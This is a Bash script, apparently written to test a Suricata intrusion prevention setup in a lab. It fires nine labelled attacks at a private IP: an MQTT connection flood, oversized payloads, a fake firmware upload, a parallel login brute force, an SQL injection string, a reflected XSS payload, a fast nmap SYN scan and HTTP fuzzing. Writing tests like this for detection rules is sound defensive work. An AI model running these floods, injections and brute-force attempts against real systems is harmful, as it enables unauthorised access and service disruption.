#!/bin/bash
# Script Lanzador de Ataques - SINCRONIZADO FINAL
# Uso: ./atacar.sh <ID_ATAQUE>

TARGET="192.168.57.30"

if [ -z "$1" ]; then
    echo "=========================================="
    echo "   SELECTOR DE ATAQUES (IPS TESTING)      "
    echo "=========================================="
    echo " 1. MQTT Connection Flood (EXP01)"
    echo " 2. MQTT Large Payload (EXP02)"
    echo " 3. Firmware Upload (EXP03)"
    echo " 4. Brute Force Login (EXP04)"
    echo " 5. SQL Injection (EXP05)"
    echo " 6. XSS Reflected (EXP06)"
    echo " 7. Large HTTP Body (EXP07)"
    echo " 8. Fast Port Scan (EXP08)"
    echo " 9. HTTP Fuzzing (EXP09)"
    echo "=========================================="
    read -p "Ingresa el número: " OPCION
else
    OPCION=$1
fi

case $OPCION in
    1|01)
        echo "[!] Lanzando MQTT Connection Flood (Regla EXP01)..."
        # MODIFICADO: Usamos '&' para lanzar 100 conexiones simultáneas
        # Esto asegura romper el umbral de Suricata
        for i in $(seq 1 100); do 
            nc -z -w 1 $TARGET 1883 & 
        done
        wait # Esperamos a que terminen los procesos de fondo
        echo "[✔] Ataque finalizado."
        ;;
    2|02)
        echo "[!] Lanzando MQTT Large Payload (Regla EXP02)..."
        # Payload de 30KB (Garantiza detectar size > buffer)
        dd if=/dev/zero bs=1024 count=30 2>/dev/null | nc $TARGET 1883
        echo "[✔] Ataque finalizado."
        ;;
    3|03)
        echo "[!] Lanzando Firmware Upload (Regla EXP03)..."
        echo "malware_test" > virus.bin
        # Usamos -v para ver si el servidor responde o se corta
        curl -v -X POST -F "firmware=@virus.bin" http://$TARGET:5000/firmware
        rm virus.bin
        echo "[✔] Ataque finalizado."
        ;;
    4|04)
        echo "[!] Lanzando SmartPlug Brute Force (Regla EXP04)..."
        # 15 intentos rápidos en paralelo
        for i in {1..15}; do
            curl -s -o /dev/null -X POST -d "username=admin&password=12345$i" http://$TARGET:5000/login &
        done
        wait
        echo "[✔] Ataque finalizado."
        ;;
    5|05)
        echo "[!] Lanzando SQL Injection (Regla EXP05)..."
        curl -v "http://$TARGET:5000/login?username=admin' OR '1'='1"
        echo "[✔] Ataque finalizado."
        ;;
    6|06)
        echo "[!] Lanzando XSS Reflected (Regla EXP06)..."
        curl -v "http://$TARGET:8080/search?q=<script>alert(1)</script>"
        echo "[✔] Ataque finalizado."
        ;;
    7|07)
        echo "[!] Lanzando Large Body Genérico (Regla EXP07)..."
        # Crear archivo 60KB
        dd if=/dev/zero of=bigfile.dat bs=1024 count=60 2>/dev/null
        curl -v -H "Content-Type: text/plain" --data-binary @bigfile.dat http://$TARGET:8080/upload
        rm bigfile.dat
        echo "[✔] Ataque finalizado."
        ;;
	# Opción 8: Port Scan (Corregida para ser RÁPIDA)
     8|08)
    	echo "[!] Lanzando Fast Port Scan (Regla EXP08)..."
    	# Quitamos --scan-delay y agregamos --min-rate para asegurar velocidad
    	# Escaneamos top-ports por defecto (1000 puertos) para asegurar superar el conteo de 100
    	nmap -sS --min-rate 2000 $TARGET
    	echo "[✔] Ataque finalizado."
    	;;

    9|09)
        echo "[!] Lanzando HTTP Fuzzing (Regla EXP09)..."
        echo "    Generando 100 peticiones violentas..."
        # MODIFICADO: Bucle paralelo (&) para saturar el umbral de 50/min
        for i in {1..100}; do 
            curl -s -o /dev/null "http://$TARGET:8080/search?q=fuzz$i" & 
        done
        wait
        echo "[✔] Ataque finalizado."
        ;;
    *)
        echo "Opción no válida."
        ;;
esac
